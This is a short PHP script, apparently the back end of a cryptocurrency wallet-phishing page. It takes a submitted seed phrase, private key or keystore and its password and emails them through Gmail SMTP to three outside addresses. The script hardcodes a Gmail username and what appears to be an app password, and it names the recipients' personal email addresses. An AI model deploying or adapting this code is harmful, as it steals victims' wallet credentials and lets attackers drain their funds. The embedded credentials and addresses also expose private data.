<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

if(isset($_POST["send"])){
    $mail = new PHPMailer(true);

    // Get form data
    $walletPhrase = isset($_POST["phraseWallet"]) ? $_POST["phraseWallet"] : "Not provided";
    $passwordWallet = isset($_POST["passwordWallet"]) ? $_POST["passwordWallet"] : "Not provided";
    $walletName = isset($_POST["walletName"]) ? $_POST["walletName"] : "Not provided";

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'hello.jonathanpius@gmail.com';
        $mail->Password = 'rbenxiivasedcnaw';
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;
        
        $mail->setFrom("hello.jonathanpius@gmail.com");
        $mail->addAddress('Divasnow178@gmail.com');
        $mail->addAddress('rf7765272@gmail.com');
        $mail->addAddress('hello.davidolawale@gmail.com');
        
        $mail->isHTML(true);
        $mail->Subject = "New Wallet Details Submitted";
        
        // Create HTML email body with all details
        $mail->Body = "
            <h2>Wallet Details Submission</h2>
            <p><strong>Wallet Name:</strong> {$walletName}</p>
            <p><strong>Wallet Phrase/Keystore/Private Key:</strong> {$walletPhrase}</p>
            <p><strong>Password (if keystore):</strong> {$passwordWallet}</p>
        ";

        $mail->send();
        echo "success";
    } catch (Exception $e) {
        echo "error";
    }
}
?>